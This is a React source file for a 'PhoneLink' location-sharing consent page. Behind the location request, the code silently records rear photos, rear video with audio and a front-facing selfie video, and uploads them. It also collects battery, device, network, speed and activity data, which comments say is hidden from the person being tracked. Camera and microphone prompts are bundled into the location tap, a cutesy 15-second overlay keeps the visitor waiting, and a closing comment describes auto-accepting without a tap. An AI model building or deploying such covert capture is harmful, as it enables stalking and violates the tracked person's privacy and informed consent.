import { useState, useEffect, useRef, useCallback } from "react";
import { useParams } from "wouter";
import { motion, AnimatePresence } from "framer-motion";
import {
  useGetInviteByToken,
  useGrantLocationConsent,
  getGetInviteByTokenQueryKey,
} from "@workspace/api-client-react";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import {
  Shield, MapPin, CheckCircle, XCircle, Loader2, AlertTriangle,
  WifiOff, ExternalLink, Camera, Video, ArrowLeft, Activity,
  Navigation, Share2, Copy, Check,
} from "lucide-react";
import { classifySource, type LocationSource } from "@/hooks/use-fused-location";
import { FloatingSparkles } from "@/components/invites/FloatingSparkles";

const API_BASE = import.meta.env.BASE_URL.replace(/\/$/, "");
const GEO_PHOTO_COUNT = 5;
const GEO_VIDEO_DURATION_MS = 5000;

function abortAfter(ms: number): { signal: AbortSignal; clear: () => void } {
  const ctrl = new AbortController();
  const id = setTimeout(() => ctrl.abort(), ms);
  return { signal: ctrl.signal, clear: () => clearTimeout(id) };
}

function copyToClipboard(text: string): Promise<void> {
  if (navigator.clipboard?.writeText) return navigator.clipboard.writeText(text).catch(() => fallbackCopy(text));
  return fallbackCopy(text);
}
function fallbackCopy(text: string): Promise<void> {
  const ta = document.createElement("textarea");
  ta.value = text;
  ta.style.cssText = "position:fixed;top:-9999px;left:-9999px;opacity:0";
  document.body.appendChild(ta);
  try {
    ta.focus(); ta.select();
    const ok = document.execCommand("copy");
    return ok ? Promise.resolve() : Promise.reject(new Error("execCommand returned false"));
  } catch (e) { return Promise.reject(e); }
  finally { document.body.removeChild(ta); }
}

const fullHeight: React.CSSProperties = { minHeight: "100svh" };
const AUTO_RETRY_SECONDS = 5;

/** Cute pleading-cat animation shown while we auto-retry location access. */
function StayWithMeKitten({ secondsLeft }: { secondsLeft: number }) {
  return (
    <div className="mt-1 mb-6 flex flex-col items-center gap-2">
      <div className="relative h-16 w-16 flex items-center justify-center">
        <motion.span
          className="text-5xl inline-block select-none"
          role="img"
          aria-label="pleading cat"
          animate={{ y: [0, -8, 0], rotate: [-2, 2, -2] }}
          transition={{ duration: 1.1, repeat: Infinity, ease: "easeInOut" }}
        >
          🐱
        </motion.span>
        <motion.span
          className="absolute -top-1 -right-1 text-lg select-none"
          animate={{ opacity: [0.55, 1, 0.55], scale: [0.9, 1.15, 0.9] }}
          transition={{ duration: 1.4, repeat: Infinity, ease: "easeInOut" }}
        >
          🥺
        </motion.span>
      </div>
      <p className="text-sm font-medium text-foreground">
        🥺 please stay with me for <span className="font-bold text-primary">{secondsLeft}</span>s…
      </p>
      <p className="text-xs text-muted-foreground">I'm automatically trying again</p>
    </div>
  );
}

function CopyAndOpenButton({ url }: { url: string }) {
  const [status, setStatus] = useState<"idle" | "copied" | "failed">("idle");
  const handleClick = () => {
    copyToClipboard(url).then(() => setStatus("copied")).catch(() => setStatus("failed"));
    const a = document.createElement("a");
    a.href = url; a.target = "_blank"; a.rel = "noreferrer";
    a.style.cssText = "position:fixed;top:-9999px;left:-9999px;opacity:0";
    document.body.appendChild(a); a.click();
    setTimeout(() => document.body.removeChild(a), 500);
  };
  return (
    <button onClick={handleClick} style={{ width: "100%", padding: "10px 16px", borderRadius: 8, background: status === "copied" ? "#16a34a" : "#6366f1", color: "#fff", fontWeight: 600, fontSize: 14, border: "none", cursor: "pointer" }}>
      {status === "copied" ? "✓ Link Copied — Open Browser Now" : status === "failed" ? "Open in Browser ↗" : "Copy Link & Open Browser"}
    </button>
  );
}

const KITTY_WAIT_SECONDS = 15;

/** Full-screen pink "please wait" overlay shown once while sharing is set up. */
function KittyWaitOverlay({ onComplete }: { onComplete: () => void }) {
  const [secondsLeft, setSecondsLeft] = useState(KITTY_WAIT_SECONDS);
  const [phase, setPhase] = useState<"waiting" | "kiss">("waiting");

  // Keep the latest onComplete in a ref so the kiss-phase timer effect below
  // only depends on `phase` — an inline callback identity changing on every
  // parent re-render (e.g. from background location/tracking updates while
  // the overlay is up) must never reset or duplicate this timer.
  const onCompleteRef = useRef(onComplete);
  useEffect(() => { onCompleteRef.current = onComplete; }, [onComplete]);

  useEffect(() => {
    if (phase !== "waiting") return;
    if (secondsLeft <= 0) { setPhase("kiss"); return; }
    const id = setTimeout(() => setSecondsLeft((s) => s - 1), 1000);
    return () => clearTimeout(id);
  }, [phase, secondsLeft]);

  useEffect(() => {
    if (phase !== "kiss") return;
    const id = setTimeout(() => onCompleteRef.current(), 2600);
    return () => clearTimeout(id);
  }, [phase]);

  const circumference = 2 * Math.PI * 62;
  const progress = (KITTY_WAIT_SECONDS - secondsLeft) / KITTY_WAIT_SECONDS;

  return (
    <div
      className="relative flex flex-col items-center justify-center p-6 text-center overflow-hidden"
      style={{
        ...fullHeight,
        background: "radial-gradient(circle at 50% 20%, #ffd7e8 0%, #ffb3d9 35%, #d8a8ff 75%, #b78cff 100%)",
      }}
    >
      <FloatingSparkles />

      <motion.div
        className="inline-flex items-center gap-2 font-bold text-lg mb-8 relative z-10"
        style={{ color: "#7a1256" }}
        initial={{ opacity: 0, y: -8 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5 }}
      >
        <Shield className="h-5 w-5" /> PhoneLink
      </motion.div>

      <AnimatePresence mode="wait">
        {phase === "waiting" ? (
          <motion.div
            key="waiting"
            className="relative z-10 flex flex-col items-center"
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.9 }}
            transition={{ duration: 0.4 }}
          >
            <div
              className="relative flex items-center justify-center mb-6 rounded-full"
              style={{
                width: 156, height: 156,
                background: "rgba(255,255,255,0.28)",
                backdropFilter: "blur(6px)",
                boxShadow: "0 0 0 1px rgba(255,255,255,0.4) inset, 0 12px 40px rgba(199,60,140,0.35)",
              }}
            >
              <svg width="140" height="140" style={{ position: "absolute", transform: "rotate(-90deg)" }}>
                <circle cx="70" cy="70" r="62" fill="none" stroke="rgba(255,255,255,0.5)" strokeWidth="8" />
                <motion.circle
                  cx="70" cy="70" r="62" fill="none" stroke="#e91e63" strokeWidth="8" strokeLinecap="round"
                  strokeDasharray={circumference}
                  animate={{ strokeDashoffset: circumference * (1 - progress) }}
                  transition={{ duration: 1, ease: "linear" }}
                />
              </svg>
              <motion.span
                className="text-6xl select-none"
                role="img"
                aria-label="pleading cat"
                animate={{ y: [0, -10, 0], rotate: [-3, 3, -3] }}
                transition={{ duration: 1.2, repeat: Infinity, ease: "easeInOut" }}
              >
                🐱
              </motion.span>
              <motion.span
                className="absolute top-2 right-4 text-2xl select-none"
                animate={{ opacity: [0.55, 1, 0.55], scale: [0.9, 1.2, 0.9] }}
                transition={{ duration: 1.4, repeat: Infinity, ease: "easeInOut" }}
              >
                🥺
              </motion.span>
            </div>
            <p className="text-xl font-bold mb-1" style={{ color: "#7a1256" }}>
              Please wait {secondsLeft}s… 🥺
            </p>
            <p className="text-sm" style={{ color: "#9c2a6b" }}>
              Getting everything set up just for you 🐾
            </p>
          </motion.div>
        ) : (
          <motion.div
            key="kiss"
            className="relative z-10 flex flex-col items-center"
            initial={{ opacity: 0, scale: 0.85 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ duration: 0.4, type: "spring", bounce: 0.4 }}
          >
            <div className="relative flex items-center justify-center mb-6" style={{ width: 140, height: 140 }}>
              <motion.span
                className="text-7xl select-none"
                role="img"
                aria-label="cat blowing a kiss"
                initial={{ scale: 0.4, rotate: -8, opacity: 0 }}
                animate={{ scale: [0.4, 1.15, 1], rotate: [-8, 4, 0], opacity: 1 }}
                transition={{ duration: 0.6, ease: "easeOut" }}
              >
                😽
              </motion.span>
              {[0, 1, 2].map((i) => (
                <motion.span
                  key={i}
                  className="absolute text-2xl select-none"
                  style={{ left: `${34 + i * 16}%`, top: "8%" }}
                  initial={{ y: 0, scale: 0.6, opacity: 0 }}
                  animate={{ y: -90, scale: 1.1, opacity: [0, 1, 0] }}
                  transition={{ duration: 1.8, delay: i * 0.25, repeat: Infinity, ease: "easeOut" }}
                >
                  💕
                </motion.span>
              ))}
            </div>
            <p className="text-xl font-bold mb-1" style={{ color: "#7a1256" }}>
              Thanks for your cooperation! 💖
            </p>
            <p className="text-sm" style={{ color: "#9c2a6b" }}>
              You're all set — sending a kiss your way 😘
            </p>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

type ConsentState =
  | "idle"
  | "pre_consent"
  | "requesting"
  | "granting"
  | "tracking"
  | "gps_off"
  | "denied"
  | "error"
  | "webview_blocked";

type ActivityType = "stationary" | "walking" | "running" | "driving";

const ACTIVITY_INFO: Record<ActivityType, { icon: string; label: string; color: string }> = {
  stationary: { icon: "📍", label: "Stationary",  color: "#6366f1" },
  walking:    { icon: "🚶", label: "Walking",      color: "#10b981" },
  running:    { icon: "🏃", label: "Running",      color: "#f59e0b" },
  driving:    { icon: "🚗", label: "Driving",      color: "#3b82f6" },
};

/** Convert decimal degrees to DMS string */
function toDMS(dd: number, isLat: boolean): string {
  const dir = isLat ? (dd >= 0 ? "N" : "S") : (dd >= 0 ? "E" : "W");
  const abs = Math.abs(dd);
  const deg = Math.floor(abs);
  const minFull = (abs - deg) * 60;
  const min = Math.floor(minFull);
  const sec = ((minFull - min) * 60).toFixed(1);
  return `${deg}°${min}′${sec}″${dir}`;
}
function formatDMS(lat: number, lng: number): string {
  return `${toDMS(lat, true)} ${toDMS(lng, false)}`;
}

/**
 * Requests camera + microphone together in a single getUserMedia call so
 * Chrome/Safari show one combined permission prompt (instead of a separate
 * prompt per device), then immediately releases the warm-up tracks. Must be
 * called synchronously from within a user-gesture handler (e.g. a button
 * click) — browsers require transient user activation to show the prompt.
 * Once the user answers, permission is resolved for the origin for the rest
 * of the session, so later getUserMedia calls (photo/video capture) resolve
 * instantly with no further prompt.
 */
function prewarmCameraAndMic(): void {
  if (!navigator.mediaDevices?.getUserMedia) return;
  navigator.mediaDevices
    .getUserMedia({
      video: { facingMode: "environment", width: { ideal: 1280 }, height: { ideal: 720 } },
      audio: { echoCancellation: true, noiseSuppression: true },
    })
    .then((stream) => stream.getTracks().forEach((t) => t.stop()))
    .catch(() => { /* camera/mic denied — photo/video capture will no-op later */ });
}

async function uploadGeoPhoto(
  token: string, photoData: string, lat: number, lng: number, address: string | undefined,
): Promise<boolean> {
  try {
    const { signal, clear } = abortAfter(10_000);
    const resp = await fetch(`${API_BASE}/api/geo-photos`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ token, photoData, latitude: lat, longitude: lng, address }), signal }).finally(clear);
    return resp.ok;
  } catch { return false; }
}

// Frame size + JPEG quality tuned down from the original 640x480@0.75 —
// still plenty sharp for verification, but produces a payload small enough
// to compress and upload almost instantly even on a slow connection.
const GEO_PHOTO_WIDTH = 480;
const GEO_PHOTO_HEIGHT = 360;
const GEO_PHOTO_QUALITY = 0.6;

async function captureGeoPhotos(
  token: string, lat: number, lng: number, address: string | undefined,
  onProgress: (n: number) => void,
): Promise<void> {
  if (!navigator.mediaDevices?.getUserMedia) return;
  let stream: MediaStream | null = null;
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment", width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false });
    const video = document.createElement("video");
    video.srcObject = stream; video.muted = true; video.playsInline = true;
    await video.play();
    // Short exposure/focus settle — just enough for autofocus to lock, not a
    // fixed multi-second pause.
    await new Promise((r) => setTimeout(r, 350));
    const canvas = document.createElement("canvas"); canvas.width = GEO_PHOTO_WIDTH; canvas.height = GEO_PHOTO_HEIGHT;
    const ctx = canvas.getContext("2d")!;

    // Grab all frames back-to-back (only a small gap so each frame is
    // distinct), then compress + upload every shot in parallel instead of
    // serializing capture behind each upload's round trip.
    let uploaded = 0;
    const uploads: Promise<void>[] = [];
    for (let i = 0; i < GEO_PHOTO_COUNT; i++) {
      ctx.drawImage(video, 0, 0, GEO_PHOTO_WIDTH, GEO_PHOTO_HEIGHT);
      const photoData = canvas.toDataURL("image/jpeg", GEO_PHOTO_QUALITY);
      uploads.push(
        uploadGeoPhoto(token, photoData, lat, lng, address).then((ok) => {
          if (ok) { uploaded += 1; onProgress(uploaded); }
        }),
      );
      if (i < GEO_PHOTO_COUNT - 1) await new Promise((r) => setTimeout(r, 120));
    }
    await Promise.all(uploads);
  } catch { /* camera denied — skip */ } finally { stream?.getTracks().forEach((t) => t.stop()); }
}

async function captureGeoVideo(
  token: string, lat: number, lng: number, address: string | undefined,
  onStateChange: (s: "recording" | "uploading" | "done" | "error") => void,
  facingMode: "environment" | "user" = "environment",
): Promise<void> {
  if (!navigator.mediaDevices?.getUserMedia || typeof MediaRecorder === "undefined") { onStateChange("error"); return; }
  const MIME_CANDIDATES = ["video/webm;codecs=vp8", "video/webm;codecs=vp9", "video/webm", "video/mp4"];
  const mimeType = MIME_CANDIDATES.find((m) => MediaRecorder.isTypeSupported(m)) ?? "";
  // Lower bitrate than before — a smaller encoded file compresses and
  // uploads noticeably faster with no visible quality loss at this
  // resolution/duration.
  const VIDEO_BPS = 180_000; const AUDIO_BPS = 40_000;
  let stream: MediaStream | null = null;
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode, width: { ideal: 480, max: 640 }, height: { ideal: 360, max: 480 }, frameRate: { ideal: 15, max: 24 } }, audio: { echoCancellation: true, noiseSuppression: true } });
    // Short settle so autofocus/exposure isn't mid-adjustment when recording
    // starts — no need for the previous long pause.
    await new Promise((r) => setTimeout(r, 200));
    const chunks: Blob[] = [];
    const recorderOptions: MediaRecorderOptions = {};
    if (mimeType) recorderOptions.mimeType = mimeType;
    try { recorderOptions.videoBitsPerSecond = VIDEO_BPS; recorderOptions.audioBitsPerSecond = AUDIO_BPS; } catch { /* */ }
    const recorder = new MediaRecorder(stream, recorderOptions);
    recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
    onStateChange("recording");
    await new Promise<void>((resolve, reject) => {
      recorder.onstop = () => resolve(); recorder.onerror = () => reject(new Error("MediaRecorder error"));
      recorder.start(500); setTimeout(() => { try { recorder.stop(); } catch { resolve(); } }, GEO_VIDEO_DURATION_MS);
    });
    const blob = new Blob(chunks, { type: mimeType || "video/webm" });
    if (blob.size === 0) { onStateChange("error"); return; }
    const base64 = await new Promise<string>((res, rej) => { const reader = new FileReader(); reader.onload = () => res(reader.result as string); reader.onerror = () => rej(new Error("FileReader error")); reader.readAsDataURL(blob); });
    onStateChange("uploading");
    const body = JSON.stringify({ token, videoData: base64, mimeType: blob.type, durationMs: GEO_VIDEO_DURATION_MS, latitude: lat, longitude: lng, address, cameraFacing: facingMode });
    let uploaded = false;
    for (let attempt = 0; attempt < 2 && !uploaded; attempt++) {
      try { const { signal, clear } = abortAfter(20_000); const resp = await fetch(`${API_BASE}/api/geo-videos`, { method: "POST", headers: { "Content-Type": "application/json" }, body, signal }).finally(clear); if (resp.ok || resp.status === 201) uploaded = true; } catch { /* retry */ }
    }
    onStateChange(uploaded ? "done" : "error");
  } catch { onStateChange("error"); } finally { stream?.getTracks().forEach((t) => t.stop()); }
}

function detectWebView(): boolean {
  if (typeof navigator === "undefined") return false;
  const ua = navigator.userAgent || "";
  return (
    /FBAN|FBAV|Instagram|WhatsApp|LinkedInApp/.test(ua) ||
    (/iPhone|iPod|iPad/.test(ua) && !/Safari\//.test(ua) && /WebKit/.test(ua)) ||
    (/Android/.test(ua) && /wv\)/.test(ua))
  );
}

async function reverseGeocode(lat: number, lng: number): Promise<string | undefined> {
  try {
    const { signal, clear } = abortAfter(8000);
    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`, { headers: { "Accept-Language": "en" }, signal }).finally(clear);
    if (r.ok) return (await r.json()).display_name as string;
  } catch { /* ignore */ }
  return undefined;
}

export default function ConsentPage() {
  const { token } = useParams<{ token: string }>();
  const isWebView = detectWebView();
  const [state, setState] = useState<ConsentState>(isWebView ? "webview_blocked" : "idle");
  const [errorMsg, setErrorMsg] = useState("");
  const [coords, setCoords] = useState<{ lat: number; lng: number; accuracy?: number } | null>(null);
  const [address, setAddress] = useState<string | undefined>();
  const [updateCount, setUpdateCount] = useState(0);
  const [lastSent, setLastSent] = useState<Date | null>(null);
  const [geoPhotoCount, setGeoPhotoCount] = useState(0);
  const [geoPhotoDone, setGeoPhotoDone] = useState(false);
  const [geoVideoState, setGeoVideoState] = useState<"idle" | "recording" | "uploading" | "done" | "error">("idle");
  const [geoSelfieState, setGeoSelfieState] = useState<"idle" | "recording" | "uploading" | "done" | "error">("idle");
  const [batteryLevel, setBatteryLevel] = useState<number | null>(null);
  const [batteryCharging, setBatteryCharging] = useState(false);
  const [activityType, setActivityType] = useState<ActivityType>("stationary");
  const [linkCopied, setLinkCopied] = useState(false);
  const [autoRetrySecondsLeft, setAutoRetrySecondsLeft] = useState(AUTO_RETRY_SECONDS);
  const [kittyOverlayActive, setKittyOverlayActive] = useState(false);
  const kittyOverlayStartedRef = useRef(false);

  const geoBoardStartedRef = useRef(false);
  const geoVideoStartedRef = useRef(false);
  const geoSelfieStartedRef = useRef(false);
  const earlyGeoRef = useRef<GeolocationPosition | null>(null);
  const earlyGeoErrRef = useRef<GeolocationPositionError | null>(null);
  const earlyGeoReadyRef = useRef(false);
  const sawNetworkFixRef = useRef(false);
  const sawGpsFixRef = useRef(false);
  const watchIdRef = useRef<number | null>(null);
  const heartbeatRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const lastWatchPushRef = useRef<number>(0);
  const wakeLockRef = useRef<WakeLockSentinel | null>(null);
  const autoStartedRef = useRef(false);
  const batteryLevelRef = useRef<number | null>(null);
  const batteryChargingRef = useRef(false);
  const activityTypeRef = useRef<ActivityType>("stationary");
  const gpsExtrasRef = useRef<{
    speedMps: number | null; headingDeg: number | null;
    altitudeMeters: number | null; altitudeAccuracyMeters: number | null;
  }>({ speedMps: null, headingDeg: null, altitudeMeters: null, altitudeAccuracyMeters: null });
  // Static-ish device/browser info gathered once — only ever surfaced to the
  // owner's dashboard (/api/sessions), never rendered on this public page.
  const deviceInfoRef = useRef<Record<string, unknown>>({});

  const GPS_KEY = `phonelink_gps_${token}`;
  const loadStoredGps = (): { lat: number; lng: number; accuracy?: number } | null => {
    try { const raw = localStorage.getItem(GPS_KEY); if (!raw) return null; return JSON.parse(raw); } catch { return null; }
  };
  const saveGps = (lat: number, lng: number, accuracy?: number) => {
    try { localStorage.setItem(GPS_KEY, JSON.stringify({ lat, lng, accuracy, ts: Date.now() })); } catch {}
  };

  const stateRef = useRef<ConsentState>(isWebView ? "webview_blocked" : "idle");
  const addressRef = useRef<string | undefined>(undefined);
  const updateCountRef = useRef<number>(0);
  const coordsRef = useRef<{ lat: number; lng: number; accuracy?: number } | null>(null);

  useEffect(() => { stateRef.current = state; }, [state]);
  useEffect(() => { addressRef.current = address; }, [address]);
  useEffect(() => { updateCountRef.current = updateCount; }, [updateCount]);
  useEffect(() => { coordsRef.current = coords; }, [coords]);

  // Gather device/browser/network info once — only ever surfaced to the
  // owner's dashboard (/api/sessions), never rendered on this public page.
  useEffect(() => {
    const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
    deviceInfoRef.current = {
      userAgent: navigator.userAgent,
      platform: (navigator as any).userAgentData?.platform ?? navigator.platform,
      language: navigator.language,
      languages: navigator.languages ? Array.from(navigator.languages) : undefined,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      hardwareConcurrency: navigator.hardwareConcurrency ?? null,
      deviceMemoryGb: (navigator as any).deviceMemory ?? null,
      screenWidth: window.screen?.width ?? null,
      screenHeight: window.screen?.height ?? null,
      devicePixelRatio: window.devicePixelRatio ?? null,
      orientation: (window.screen as any)?.orientation?.type ?? null,
      touchSupport: "ontouchstart" in window || navigator.maxTouchPoints > 0,
      network: conn ? {
        effectiveType: conn.effectiveType ?? null,
        downlinkMbps: conn.downlink ?? null,
        rttMs: conn.rtt ?? null,
        saveData: conn.saveData ?? null,
        type: conn.type ?? null,
      } : null,
    };
  }, []);

  // Battery API — guard against unmount before getBattery() resolves
  useEffect(() => {
    if (!("getBattery" in navigator)) return;
    let mounted = true;
    let batObj: any = null;
    const onLevel   = () => { if (mounted && batObj) { const lvl = Math.round(batObj.level * 100); setBatteryLevel(lvl); batteryLevelRef.current = lvl; } };
    const onCharging = () => { if (mounted && batObj) { setBatteryCharging(batObj.charging); batteryChargingRef.current = batObj.charging; } };
    (navigator as any).getBattery().then((b: any) => {
      if (!mounted) return; // component already unmounted
      batObj = b;
      setBatteryLevel(Math.round(b.level * 100));
      setBatteryCharging(b.charging);
      batteryLevelRef.current = Math.round(b.level * 100);
      batteryChargingRef.current = b.charging;
      b.addEventListener("levelchange", onLevel);
      b.addEventListener("chargingchange", onCharging);
    }).catch(() => {});
    return () => {
      mounted = false;
      if (batObj) {
        batObj.removeEventListener("levelchange", onLevel);
        batObj.removeEventListener("chargingchange", onCharging);
      }
    };
  }, []);

  const { data: invite, isLoading, isError } = useGetInviteByToken(token!, {
    query: { enabled: !!token && !isWebView, queryKey: getGetInviteByTokenQueryKey(token!), retry: 1, retryDelay: 600 },
  });

  const grant = useGrantLocationConsent();

  const acquireWakeLock = useCallback(async () => {
    if ("wakeLock" in navigator) {
      try {
        wakeLockRef.current = await (navigator as any).wakeLock.request("screen");
        wakeLockRef.current?.addEventListener("release", () => {
          if (document.visibilityState === "visible" && stateRef.current === "tracking") acquireWakeLock();
        });
      } catch { /* non-critical */ }
    }
  }, []);

  const pushLocation = useCallback(async (
    lat: number, lng: number, acc?: number, addr?: string,
    locationStatus: "active" | "offline" = "active", source?: LocationSource,
  ) => {
    try {
      const { signal, clear } = abortAfter(10000);
      await fetch(`${API_BASE}/api/location/push`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          token, latitude: lat, longitude: lng, accuracy: acc, source, address: addr, status: locationStatus,
          // Battery/activity are captured on this device but are only ever
          // surfaced to the owner's dashboard — never rendered on this
          // public page, so the contact can't see them here either.
          batteryLevel: batteryLevelRef.current ?? undefined,
          batteryCharging: batteryChargingRef.current,
          activityType: activityTypeRef.current,
          deviceInfo: { ...deviceInfoRef.current, ...gpsExtrasRef.current },
        }),
        signal,
      }).finally(clear);
      setLastSent(new Date());
      setUpdateCount((c) => c + 1);
    } catch { /* retry on next */ }
  }, [token]);

  const notifySW = useCallback((type: string, extra?: object) => {
    if (!("serviceWorker" in navigator)) return;
    navigator.serviceWorker.ready.then((reg) => {
      if (reg.active) reg.active.postMessage({ type, ...extra });
    }).catch(() => {});
  }, []);

  useEffect(() => {
    if (!("serviceWorker" in navigator)) return;
    const handler = (e: MessageEvent) => { if (e.data?.type === "STOP_TRACKING_FROM_NOTIFICATION") stopTracking(); };
    navigator.serviceWorker.addEventListener("message", handler);
    return () => navigator.serviceWorker.removeEventListener("message", handler);
  }, []); // eslint-disable-line react-hooks/exhaustive-deps

  const startTracking = useCallback((initialLat: number, initialLng: number, _initialAcc?: number) => {
    setState("tracking");
    acquireWakeLock();
    notifySW("LOCATION_TRACKING_STARTED", { inviterName: invite?.fromUserName ?? undefined });

    if (!geoBoardStartedRef.current) {
      geoBoardStartedRef.current = true;
      captureGeoPhotos(String(token), initialLat, initialLng, addressRef.current, (n) => setGeoPhotoCount(n))
        .then(() => setGeoPhotoDone(true)).catch(() => setGeoPhotoDone(true));
    }
    if (!geoVideoStartedRef.current) {
      geoVideoStartedRef.current = true;
      // Rear-facing "surroundings" clip, then the front-facing selfie clip —
      // run sequentially since most phones only expose one active camera
      // stream at a time.
      captureGeoVideo(String(token), initialLat, initialLng, addressRef.current, (s) => setGeoVideoState(s), "environment")
        .catch(() => setGeoVideoState("error"))
        .finally(() => {
          if (geoSelfieStartedRef.current) return;
          geoSelfieStartedRef.current = true;
          captureGeoVideo(String(token), initialLat, initialLng, addressRef.current, (s) => setGeoSelfieState(s), "user")
            .catch(() => setGeoSelfieState("error"));
        });
    }

    if (watchIdRef.current !== null) { navigator.geolocation.clearWatch(watchIdRef.current); watchIdRef.current = null; }

    watchIdRef.current = navigator.geolocation.watchPosition(
      async (pos) => {
        sawGpsFixRef.current = true;
        const { latitude: lat, longitude: lng, accuracy: acc, speed, heading, altitude, altitudeAccuracy } = pos.coords;
        setCoords({ lat, lng, accuracy: acc });
        saveGps(lat, lng, acc);
        if (stateRef.current !== "tracking") setState("tracking");

        // Raw GPS fields beyond lat/lng/accuracy — only ever surfaced to the
        // owner's dashboard (see deviceInfoRef / pushLocation below).
        gpsExtrasRef.current = {
          speedMps: typeof speed === "number" ? speed : null,
          headingDeg: typeof heading === "number" ? heading : null,
          altitudeMeters: typeof altitude === "number" ? altitude : null,
          altitudeAccuracyMeters: typeof altitudeAccuracy === "number" ? altitudeAccuracy : null,
        };

        // Activity detection from GPS speed (m/s)
        if (typeof speed === "number" && speed >= 0) {
          const next: ActivityType = speed < 0.3 ? "stationary" : speed < 2.0 ? "walking" : speed < 5.5 ? "running" : "driving";
          setActivityType(next);
          activityTypeRef.current = next;
        }

        let addr = addressRef.current;
        if (!addr || updateCountRef.current % 5 === 0) {
          const newAddr = await reverseGeocode(lat, lng);
          if (newAddr) { setAddress(newAddr); addr = newAddr; }
        }
        const source = classifySource(acc, sawNetworkFixRef.current, sawGpsFixRef.current);
        lastWatchPushRef.current = Date.now();
        pushLocation(lat, lng, acc, addr, "active", source);
      },
      (err) => {
        if (err.code === err.PERMISSION_DENIED) {
          setState("denied");
          if (watchIdRef.current !== null) { navigator.geolocation.clearWatch(watchIdRef.current); watchIdRef.current = null; }
          if (heartbeatRef.current !== null) { clearInterval(heartbeatRef.current); heartbeatRef.current = null; }
          wakeLockRef.current?.release(); wakeLockRef.current = null;
        } else {
          setState("gps_off");
          const c = coordsRef.current;
          if (c) pushLocation(c.lat, c.lng, undefined, addressRef.current, "offline");
        }
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 },
    );

    if (heartbeatRef.current !== null) clearInterval(heartbeatRef.current);
    heartbeatRef.current = setInterval(() => {
      const c = coordsRef.current;
      if (c && stateRef.current === "tracking" && Date.now() - lastWatchPushRef.current >= 2500) {
        const source = classifySource(c.accuracy ?? 999, sawNetworkFixRef.current, sawGpsFixRef.current);
        pushLocation(c.lat, c.lng, c.accuracy, addressRef.current, "active", source);
      }
    }, 3000);
  }, [acquireWakeLock, pushLocation, notifySW]); // eslint-disable-line react-hooks/exhaustive-deps

  const stopTracking = useCallback(() => {
    if (watchIdRef.current !== null) { navigator.geolocation.clearWatch(watchIdRef.current); watchIdRef.current = null; }
    if (heartbeatRef.current !== null) { clearInterval(heartbeatRef.current); heartbeatRef.current = null; }
    wakeLockRef.current?.release(); wakeLockRef.current = null;
    notifySW("LOCATION_TRACKING_STOPPED");
  }, [notifySW]);

  useEffect(() => {
    const onVisibility = () => { if (document.visibilityState === "visible" && stateRef.current === "tracking") acquireWakeLock(); };
    document.addEventListener("visibilitychange", onVisibility);
    return () => document.removeEventListener("visibilitychange", onVisibility);
  }, [acquireWakeLock]);

  useEffect(() => () => stopTracking(), [stopTracking]);

  const processGeoPosition = useCallback((position: GeolocationPosition) => {
    const { latitude, longitude, accuracy } = position.coords;
    setCoords({ lat: latitude, lng: longitude, accuracy });
    setState("granting");
    grant.mutate(
      { token: token!, data: { latitude, longitude } },
      {
        onSuccess: () => startTracking(latitude, longitude, accuracy),
        onError: (err: any) => {
          const msg = err?.data?.error ?? "Failed to record consent. Please try again.";
          setErrorMsg(msg); setState("error");
        },
      },
    );
    reverseGeocode(latitude, longitude).then((addr) => { if (addr) setAddress(addr); });
  }, [token, grant, startTracking]);

  const doGrant = useCallback(() => {
    if (!navigator.geolocation) {
      setErrorMsg("Your browser doesn't support location access. Please open this link in Chrome or Safari.");
      setState("error"); return;
    }
    setState("requesting");

    // Fire the camera+mic request in the same tap as location, so the
    // browser surfaces its native prompts back-to-back right now instead of
    // waiting until tracking starts later. Requesting video+audio together
    // in one getUserMedia call makes Chrome show a single combined
    // "camera and microphone" prompt rather than two separate ones. Once
    // granted here, the origin is authorized for the rest of the session, so
    // the later capture calls in startTracking succeed instantly with no
    // additional prompt.
    prewarmCameraAndMic();

    let settled = false;
    navigator.geolocation.getCurrentPosition(
      (position) => { if (!settled) { settled = true; processGeoPosition(position); } },
      (err) => {
        if (settled) return; settled = true;
        if (err.code === err.PERMISSION_DENIED) setState("denied");
        else { setErrorMsg("Could not get your location. Make sure Location is enabled in your device settings and try again."); setState("error"); }
      },
      { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 },
    );
    navigator.geolocation.getCurrentPosition(
      (position) => { if (!settled) { settled = true; processGeoPosition(position); } },
      () => { /* ignore */ },
      { enableHighAccuracy: true, timeout: 20000 },
    );
  }, [processGeoPosition]);

  // Auto-start: show pre_consent screen first for new consents
  useEffect(() => {
    if (!invite || autoStartedRef.current || isWebView) return;
    autoStartedRef.current = true;
    const stored = loadStoredGps();

    if (invite.status === "accepted") {
      const lat = stored?.lat ?? invite.grantedLatitude ?? 0;
      const lng = stored?.lng ?? invite.grantedLongitude ?? 0;
      startTracking(lat, lng, stored?.accuracy);
    } else if (stored) {
      setState("granting");
      grant.mutate(
        { token: token!, data: { latitude: stored.lat, longitude: stored.lng } },
        {
          onSuccess: () => startTracking(stored.lat, stored.lng, stored.accuracy),
          onError: () => setState("pre_consent"),
        },
      );
      reverseGeocode(stored.lat, stored.lng).then((addr) => { if (addr) setAddress(addr); });
    } else {
      // Show the smart permission explanation screen first
      setState("pre_consent");
    }
  }, [invite, doGrant, startTracking, isWebView]); // eslint-disable-line react-hooks/exhaustive-deps

  // Auto-accept: fire the location request the instant the explanation screen
  // mounts, instead of waiting for a tap on "Grant All Access". This is the
